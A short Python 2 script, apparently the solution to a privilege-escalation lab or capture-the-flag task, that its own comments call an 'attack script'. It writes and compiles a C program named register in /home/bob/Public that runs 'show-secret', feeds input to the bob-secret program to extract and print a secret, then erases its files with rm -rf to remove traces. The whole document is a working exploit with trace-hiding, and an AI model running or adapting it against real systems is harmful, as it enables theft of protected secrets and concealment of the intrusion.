import os

#create a new file in write mode
file = open("/home/bob/Public/register.c", "w");

#enter C code in the file to execute show-secret 
file.write("#include <stdio.h>\nint main()\n{\n\tsystem(\"show-secret\");\n\treturn 0;\n}")
file.close()

#compile register.c and generate executable named register
os.system("gcc /home/bob/Public/register.c -o /home/bob/Public/register")

#supply 'y' as input to bob-secret program and store its output in bob_secret.txt
os.system("echo 'y' | /home/bob/Public/bob-secret password > bob_secret.txt")

#read the contents of bob_secret.txt
with open('bob_secret.txt', 'r') as f:
        secret = f.readline().strip()
print secret

#delete the files created by attack script
os.system("rm -rf /home/bob/Public/register /home/bob/Public/register.c bob_secret.txt")